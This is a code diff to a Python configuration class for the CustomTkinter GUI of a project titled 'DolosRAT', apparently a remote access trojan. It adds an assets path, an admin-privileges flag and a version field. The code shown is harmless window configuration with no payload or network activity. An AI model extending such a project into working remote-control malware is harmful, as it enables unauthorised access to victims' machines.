@@ -11,10 +11,11 @@
 
 # Built-in/Generic Imports.
 from dataclasses import dataclass
-from typing import Any, Dict, Optional
+from typing import Any, Dict
+from pathlib import Path
 
 # Modules.
-from config import Config
+from config import Config # pylint: disable=import-error
 
 @dataclass
 class CTkinterConfig(Config):
@@ -28,24 +29,33 @@ class CTkinterConfig(Config):
     # configuration.
     _conf: Dict[str, Any]
 
-    def __init__(self: object, version: str) -> None:
+    def __init__(
+        self: object,
+        version: str,
+        assets_path: Path,
+        admin_privs: bool
+    ) -> None:
         """_summary_
 
         Args:
             self (object): _description_
         """
 
+        # Version no. of DolosRAT.
+        self.version = version
+
         self._conf = {
-            'app_geometry': '600x500',
-            'app_title': f'DolosRAT { version }',
-            'app_icon': ''
+            'app_geometry': '700x500',
+            'app_title': f'DolosRAT { self.version }',
+            'app_assets_dir': assets_path,
+            'app_admin': admin_privs
         }
 
-def get_ctkinter_conf(version: str) -> CTkinterConfig:
+def get_ctkinter_conf(version: str, assets_path: Path, admin_privs: bool) -> CTkinterConfig:
     """_summary_
 
     Returns:
         CTkinterConfig: _description_
     """
 
-    return CTkinterConfig(version)
+    return CTkinterConfig(version, assets_path, admin_privs)
